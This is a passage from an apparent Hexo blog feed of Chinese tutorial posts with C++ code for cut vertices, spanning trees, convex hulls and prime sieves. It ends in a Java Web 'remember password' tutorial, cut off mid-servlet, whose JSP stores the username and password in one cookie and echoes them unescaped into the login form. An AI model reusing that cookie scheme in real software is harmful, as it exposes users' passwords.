class="line"><span class="comment">// vertexs[] 邻接表 verCut 割点集合</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; vertexs[MAXN], verCut, item(<span class="number">2</span>);</span><br><span class="line"><span class="keyword">int</span> dfn[MAXN], low[MAXN];</span><br><span class="line"><span class="keyword">int</span> n, m, countTime = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Tarjan</span><span class="params">(<span class="keyword">int</span> nowVertex, <span class="keyword">int</span> father = <span class="number">0</span>)</span> </span>&#123;</span><br><span class="line">    dfn[nowVertex] = low[nowVertex] = countTime++;</span><br><span class="line">    <span class="keyword">int</span> child, childTree = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; vertexs[nowVertex].<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        child = vertexs[nowVertex][i];</span><br><span class="line">        <span class="keyword">if</span> (child == father) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span> (!dfn[child]) &#123;</span><br><span class="line">            childTree++;</span><br><span class="line">            Tarjan(child, nowVertex);</span><br><span class="line">            <span class="keyword">if</span> (dfn[nowVertex] &lt;= low[child]) flag = <span class="literal">true</span>;</span><br><span class="line">            low[nowVertex] = <span class="built_in">min</span>(low[nowVertex], low[child]);</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">            low[nowVertex] = <span class="built_in">min</span>(low[nowVertex], dfn[child]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((!father &amp;&amp; childTree &gt; <span class="number">1</span>) || (father &amp;&amp; flag))</span><br><span class="line">        verCut.push_back(nowVertex);</span><br><span class="line">    <span class="keyword">if</span> (father &amp;&amp; low[nowVertex] &gt; dfn[father]) &#123;</span><br><span class="line">        item[<span class="number">0</span>] = father;</span><br><span class="line">        item[<span class="number">1</span>] = nowVertex;</span><br><span class="line">        edgeCut.push_back(item);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dfn, <span class="number">0</span>, <span class="keyword">sizeof</span>(dfn));</span><br><span class="line">    <span class="keyword">int</span> u, v;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n &gt;&gt; m;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; u &gt;&gt; v;</span><br><span class="line">        vertexs[u].push_back(v);</span><br><span class="line">        vertexs[v].push_back(u);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">        <span class="keyword">if</span> (!dfn[i]) Tarjan(i);</span><br><span class="line">    <span class="comment">/* for (int i = 1; i &lt;= n; i++)</span></span><br><span class="line"><span class="comment">        printf("%d : %d ---- %d \n", i, dfn[i], low[i]); */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"verCut's is : %d\n"</span>, verCut.<span class="built_in">size</span>());</span><br><span class="line">    <span class="keyword">if</span> (verCut.<span class="built_in">size</span>() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        sort(verCut.<span class="built_in">begin</span>(), verCut.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; verCut.<span class="built_in">size</span>(); i++) <span class="built_in">printf</span>(<span class="string">"%d "</span>, verCut[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\ndgeCut's is : %d\n"</span>, edgeCut.<span class="built_in">size</span>());</span><br><span class="line">    <span class="keyword">if</span> (edgeCut.<span class="built_in">size</span>() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; edgeCut.<span class="built_in">size</span>(); i++)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%d---%d\n"</span>, edgeCut[i][<span class="number">0</span>], edgeCut[i][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">6 7</span></span><br><span class="line"><span class="comment">1 2</span></span><br><span class="line"><span class="comment">1 3</span></span><br><span class="line"><span class="comment">1 4</span></span><br><span class="line"><span class="comment">2 5</span></span><br><span class="line"><span class="comment">3 5</span></span><br><span class="line"><span class="comment">4 5</span></span><br><span class="line"><span class="comment">5 6</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">8 7</span></span><br><span class="line"><span class="comment">1 2</span></span><br><span class="line"><span class="comment">1 3</span></span><br><span class="line"><span class="comment">1 4</span></span><br><span class="line"><span class="comment">2 5</span></span><br><span class="line"><span class="comment">3 5</span></span><br><span class="line"><span class="comment">4 5</span></span><br><span class="line"><span class="comment">5 6</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">8 8</span></span><br><span class="line"><span class="comment">1 2</span></span><br><span class="line"><span class="comment">1 3</span></span><br><span class="line"><span class="comment">2 3</span></span><br><span class="line"><span class="comment">2 4</span></span><br><span class="line"><span class="comment">5 6</span></span><br><span class="line"><span class="comment">5 7</span></span><br><span class="line"><span class="comment">6 7</span></span><br><span class="line"><span class="comment">7 8</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">6 6</span></span><br><span class="line"><span class="comment">1 2</span></span><br><span class="line"><span class="comment">1 3</span></span><br><span class="line"><span class="comment">2 3</span></span><br><span class="line"><span class="comment">2 4</span></span><br><span class="line"><span class="comment">2 5</span></span><br><span class="line"><span class="comment">5 6</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>递归</tag>
      </tags>
  </entry>
  <entry>
    <title>两种方法求最小生成树</title>
    <url>/2020/10/15/%E4%B8%A4%E7%A7%8D%E6%96%B9%E6%B3%95%E6%B1%82%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91/</url>
    <content><![CDATA[<h2 id="Prim算法"><a href="#Prim算法" class="headerlink" title="Prim算法"></a><code>Prim</code>算法<a id="more"></a></h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXLEN 28</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> INF = <span class="number">0x7fffffff</span>;</span><br><span class="line"><span class="keyword">int</span> graph[MAXLEN][MAXLEN], minDis[MAXLEN];</span><br><span class="line"><span class="keyword">bool</span> visited[MAXLEN];</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">prim</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(visited,<span class="literal">false</span>,<span class="keyword">sizeof</span>(visited));</span><br><span class="line">    minDis[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    visited[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">    <span class="comment">// 初始化各个点到最小生成树点集，即初始点的距离</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n;i++)</span><br><span class="line">        minDis[i] = graph[<span class="number">0</span>][i] == <span class="number">0</span> ? INF : graph[<span class="number">0</span>][i];</span><br><span class="line">    <span class="comment">// 循环 n-1 次即可</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; n;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> u = <span class="number">-1</span>,minD = INF;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; n;j++)&#123;</span><br><span class="line">            <span class="comment">// 找出连接两个集合中最短边的点</span></span><br><span class="line">            <span class="keyword">if</span>(!visited[j] &amp;&amp; minD &gt; minDis[j])&#123;</span><br><span class="line">                u = j;</span><br><span class="line">                minD = minDis[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        sum += minD;</span><br><span class="line">        visited[u] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j&lt; n;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!visited[j] &amp;&amp; graph[u][j] != <span class="number">0</span> &amp;&amp; graph[u][j] &lt; minDis[j])&#123;</span><br><span class="line">                <span class="comment">// 更新该点到最小生成树点集的距离</span></span><br><span class="line">                minDis[j] = graph[u][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt; sum &lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Kruskal算法（配合并查集）"><a href="#Kruskal算法（配合并查集）" class="headerlink" title="Kruskal算法（配合并查集）"></a><code>Kruskal</code>算法（配合并查集）</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> path[<span class="number">102</span>], parent[<span class="number">102</span>];</span><br><span class="line"><span class="keyword">int</span> n, edgeNum;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">villageEdge</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> u;</span><br><span class="line">    <span class="keyword">int</span> v;</span><br><span class="line">    <span class="keyword">int</span> dist;</span><br><span class="line">&#125;;</span><br><span class="line">villageEdge villages[<span class="number">5202</span>];</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">myCmp</span><span class="params">(villageEdge a, villageEdge b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a.dist &lt; b.dist;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getParent</span><span class="params">(<span class="keyword">int</span> son)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> p = parent[son];</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="number">0</span>) parent[son] = son;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (p != son) parent[son] = getParent(p);</span><br><span class="line">    <span class="keyword">return</span> parent[son];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MST</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> uParent, vParent, sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; edgeNum;i++)&#123;</span><br><span class="line">        uParent = getParent(villages[i].u);</span><br><span class="line">        vParent = getParent(villages[i].v);</span><br><span class="line">        <span class="keyword">if</span>(vParent != uParent)&#123;</span><br><span class="line">            sum += villages[i].dist;</span><br><span class="line">            <span class="keyword">if</span>(path[uParent] &lt; path[vParent])&#123;</span><br><span class="line">                parent[uParent] = vParent;</span><br><span class="line">                path[vParent]++;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                parent[vParent] = uParent;</span><br><span class="line">                path[uParent]++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>最小生成树</tag>
      </tags>
  </entry>
  <entry>
    <title>计算几何之凸包</title>
    <url>/2020/10/05/%E8%AE%A1%E7%AE%97%E5%87%A0%E4%BD%95%E4%B9%8B%E5%87%B8%E5%8C%85/</url>
    <content><![CDATA[<h2 id="计算几何之凸包"><a href="#计算几何之凸包" class="headerlink" title="计算几何之凸包"></a>计算几何之凸包</h2><p>凸包的大概意思是，在点集<code>A</code>中，选取子集<code>a</code>，将<code>a</code>中的点进行连线形成多边形（假若<code>a</code>中的点共线，则将多边形视为高度为0的长方形），则<code>A</code>中的点要么在多边形内部、要么在多边形上。<a id="more"></a></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN 100</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Point</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="keyword">int</span> y;</span><br><span class="line">&#125;;</span><br><span class="line">Point points[MAXN + <span class="number">1</span>];</span><br><span class="line">Point <span class="built_in">stack</span>[MAXN + <span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> length;</span><br><span class="line"><span class="comment">// 向量叉积</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mul</span><span class="params">(Point a, Point b, Point c)</span> </span>&#123; <span class="keyword">return</span> (b.x - a.x) * (c.y - b.y) - (c.x - b.x) * (b.y - a.y); &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">andrew</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> top1 = <span class="number">0</span>, top2;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">       <span class="comment">// 如果取 &lt;= 则不包含共线情况</span></span><br><span class="line">        <span class="keyword">while</span> (top1 &gt; <span class="number">1</span> &amp;&amp; mul(<span class="built_in">stack</span>[top1 - <span class="number">2</span>], <span class="built_in">stack</span>[top1 - <span class="number">1</span>], points[i]) &lt;= <span class="number">0</span>) top1--;</span><br><span class="line">        <span class="built_in">stack</span>[top1++] = points[i];</span><br><span class="line">    &#125;</span><br><span class="line">    top2 = top1;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">while</span> (top1 &gt; top2 &amp;&amp; mul(<span class="built_in">stack</span>[top1 - <span class="number">2</span>], <span class="built_in">stack</span>[top1 - <span class="number">1</span>], points[i]) &lt;= <span class="number">0</span>) top1--;</span><br><span class="line">        <span class="built_in">stack</span>[top1++] = points[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(Point a, Point b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a.x == b.x) <span class="keyword">return</span> a.y &lt; b.y;</span><br><span class="line">    <span class="keyword">return</span> a.x &lt; b.x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>凸包</tag>
      </tags>
  </entry>
  <entry>
    <title>几种求质数的方法</title>
    <url>/2020/10/03/%E5%87%A0%E7%A7%8D%E6%B1%82%E8%B4%A8%E6%95%B0%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h2 id="暴力法"><a href="#暴力法" class="headerlink" title="暴力法"></a>暴力法</h2><p>也称定义法</p>
<blockquote>
<p>质数是指在大于1的自然数中，除了1和它本身以外不再有其他因数的自然数。</p>
</blockquote>
<p>对于给定数字<code>n</code>，直接枚举<code>j</code>从1到<code>n-1</code>，如果<code>j</code>能够整除<code>n</code>，说明<code>n</code>不是质数<a id="more"></a></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">prime_simple</span><span class="params">(<span class="keyword">int</span> num)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(num == <span class="number">1</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">2</span>;i &lt;= num - <span class="number">1</span>;i++)</span><br><span class="line">        <span class="keyword">if</span>(num % i == <span class="number">0</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对于只是判断一个数字的时候，时间复杂度是<code>O(n)</code>，但是当我们需要判断某个区间的质数的时候，时间复杂度就上升到了<code>O(n^2)</code>。</p>
<h2 id="简单优化"><a href="#简单优化" class="headerlink" title="简单优化"></a>简单优化</h2><p>实际上枚举<code>j</code>到根号<code>n</code>就可以了，因为对于非质数<code>num</code>，存在<code>a*b==num</code>，若<code>a</code>和<code>b</code>均不为1，则<code>a</code>和<code>b</code>中必有且仅有一个大于等于根号<code>num</code></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">prime_advanced</span><span class="params">(<span class="keyword">int</span> num)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(num == <span class="number">1</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">2</span>;i * i &lt;= num;i++)</span><br><span class="line">        <span class="keyword">if</span>(num % i == <span class="number">0</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对于只是判断一个数字的时候，时间复杂度是<code>√n</code>，但是当我们需要判断某个区间的质数的时候，时间复杂度就上升到了<code>O(n√n)</code>。</p>
<h2 id="埃拉托斯特尼筛法"><a href="#埃拉托斯特尼筛法" class="headerlink" title="埃拉托斯特尼筛法"></a>埃拉托斯特尼筛法</h2><p>对于频繁求区间质数个数、区间跨度较大的情况，上面的方法效率很低，因为每次计算一个数字，都要从2进行枚举；我们换个思路想想，能够被质数整除的数字一定是合数（非质数），那我们直接将求得的质数，然后乘以相应的数字，得到的就一定是合数，将这些合数删去，不就只剩下了质数了吗？</p>
<p>筛选法的总体思路就是：首先假设序列<code>num=2、3、4、5、……、n</code>都是质数</p>
<ul>
<li>2作为<code>num</code>的第一个质数，将2的倍数<code>4,6,8,……,</code>标记为合数</li>
<li>3作为<code>num</code>的第二个质数，将3的倍数<code>6,9,12,……</code>标记为合数</li>
<li>5作为<code>num</code>的第三个质数，将5的倍数<code>10,15,20,……</code>标记为合数</li>
</ul>
<p>每次取序列中的一个数字<code>a</code>作为筛选的依据，在这里的<code>a</code>同样枚举到不超过<code>√n</code>即可。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN 1000</span></span><br><span class="line"><span class="keyword">bool</span> isPrime[MAXN];</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">prime_super</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(isPrime, <span class="literal">true</span>, <span class="keyword">sizeof</span>(isPrime));</span><br><span class="line">    isPrime[<span class="number">1</span>] = <span class="literal">false</span>, isPrime[<span class="number">0</span>] = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i * i &lt;= MAXN; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!isPrime[i]) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = i * i; j &lt; MAXN; j += i) &#123;</span><br><span class="line">            isPrime[j] = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的时间复杂度我不太懂计算，但是至少比简单优化方法高效。</p>
<h2 id="线性筛法–欧拉筛法"><a href="#线性筛法–欧拉筛法" class="headerlink" title="线性筛法–欧拉筛法"></a>线性筛法–欧拉筛法</h2><p>但是我们也会发现，有些数字被删除了好几次，比如说12，第一次被2删除，第二次被3删除；120分别被2、3、5删除，……，这样子我们的程序还是不够快，有没有办法能够确定每一个合数都只被删除一次呢？答案是有的，可以证明一个合数<code>num</code>的最小非1的因子一定是一个不大于<code>√n</code>的质数，利用这个性质，利用质数进行筛选的时候可以提前进行结束删除：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 存放质数，可以不需要该数组，通过 isDeleted[] 也可以判断是否为质数，只不过使用</span></span><br><span class="line"><span class="comment">// prime[] 的速度可以更加快</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN 1000</span></span><br><span class="line"><span class="keyword">int</span> prime[MAXN];</span><br><span class="line"><span class="keyword">bool</span> isDeleted[MAXN];</span><br><span class="line"><span class="keyword">int</span> lastPrimeIndex = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">prime_extreme</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(isDeleted, <span class="literal">false</span>, <span class="keyword">sizeof</span>(isDeleted));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; MAXN; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!isDeleted[i]) prime[lastPrimeIndex++] = i;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; lastPrimeIndex &amp;&amp; i * prime[j] &lt; MAXN; j++) &#123;</span><br><span class="line">            isDeleted[i * prime[j]] = <span class="literal">true</span>;</span><br><span class="line">            <span class="comment">// 提前结束删除过程</span></span><br><span class="line">            <span class="keyword">if</span> (i % prime[j] == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>质数</tag>
        <tag>筛选法</tag>
      </tags>
  </entry>
  <entry>
    <title>Java Web 通过操控Cookie实现记住密码</title>
    <url>/2020/09/25/Java-Web-%E9%80%9A%E8%BF%87%E6%93%8D%E6%8E%A7Cookie%E5%AE%9E%E7%8E%B0%E8%AE%B0%E4%BD%8F%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<h2 id="什么是Cookie？"><a href="#什么是Cookie？" class="headerlink" title="什么是Cookie？"></a>什么是Cookie？</h2><p>引用百度<a href="https://baike.baidu.com/item/cookie/1119" target="_blank" rel="noopener">百科</a>的说法，</p>
<blockquote>
<p>Cookie，有时也用其复数形式 <a href="https://baike.baidu.com/item/Cookies/187064" target="_blank" rel="noopener">Cookies</a>。类型为“<strong>小型文本文件</strong>”，是某些网站为了辨别用户身份，进行<a href="https://baike.baidu.com/item/Session/479100" target="_blank" rel="noopener">Session</a>跟踪而储存在用户本地终端上的数据（通常经过加密），由用户<a href="https://baike.baidu.com/item/客户端/101081" target="_blank" rel="noopener">客户端</a>计算机暂时或永久保存的信息</p>
</blockquote>
<p>说白了就是将浏览器上面的一些信息保存在用户的电脑上面，当然了这些数据一般不会产生严重影响，因为它永远不会以任何方式执行，也就避免带来了病毒或者攻击用户电脑，并且一般浏览器都会对<code>Cookie</code>的个数有限制，不用担心塞满用户电脑。<a id="more"></a></p>
<h2 id="有什么用？"><a href="#有什么用？" class="headerlink" title="有什么用？"></a>有什么用？</h2><p>可以用来记录用户访问该网站的频率、时间段等，最常用的就是“记住用户名和密码”，在一些登陆网站，当用户登陆的时候选择了“记住密码”，<code>Web</code>服务端就将用户名和密码进行处理（一般就是将密码进行加密），然后将处理后的字符串封装成一个<code>Cookie</code>进行保存。</p>
<h2 id="怎么用？"><a href="#怎么用？" class="headerlink" title="怎么用？"></a>怎么用？</h2><p>以<code>Java Web</code>为例：</p>
<p>首先新建登陆页面：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">%--</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Author:</span> <span class="attr">Yalexin</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Email:</span> <span class="attr">181303209</span>@<span class="attr">yzu.edu.cn</span> </span></span><br><span class="line"><span class="tag"><span class="attr">--</span>%&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">contentType</span>=<span class="string">"text/html;charset=UTF-8"</span> <span class="attr">language</span>=<span class="string">"java"</span> %&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">%</span></span></span><br><span class="line"><span class="tag">        <span class="attr">String</span> <span class="attr">username</span> = <span class="string">""</span>, <span class="attr">password</span> = <span class="string">""</span>;</span></span><br><span class="line"><span class="tag">        <span class="attr">Cookie</span>[] <span class="attr">cookies1</span> = <span class="string">request.getCookies();</span></span></span><br><span class="line"><span class="tag">        <span class="attr">if</span> (<span class="attr">cookies1</span> != <span class="string">null)&#123;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">for</span> (<span class="attr">Cookie</span> <span class="attr">cookie</span> <span class="attr">:</span> <span class="attr">cookies1</span>)&#123;</span></span><br><span class="line"><span class="tag">                <span class="attr">if</span> (<span class="attr">cookie.getName</span>()<span class="attr">.equals</span>("<span class="attr">userCookie</span>"))&#123;</span></span><br><span class="line"><span class="tag">                    <span class="attr">String</span>[] <span class="attr">split</span> = <span class="string">cookie.getValue().split(</span>"<span class="attr">-</span>&gt;</span>");</span><br><span class="line">                    username = split[0];</span><br><span class="line">                    password = split[1];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    %&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"login_1"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"&lt;%=username%&gt;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"&lt;%=password%&gt;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"登陆"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>创建<code>Servlet</code>，处理<code>post</code>请求：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Yalexin</span></span><br><span class="line"><span class="comment"> * Email: 181303209@yzu.edu.cn</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">package</span> com.yalexin;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.Cookie;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet</span>(urlPatterns = <span class="string">"/login_1"</span>, name = <span class="string">"Login_1Servlet"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Login_1Servlet</span> <span 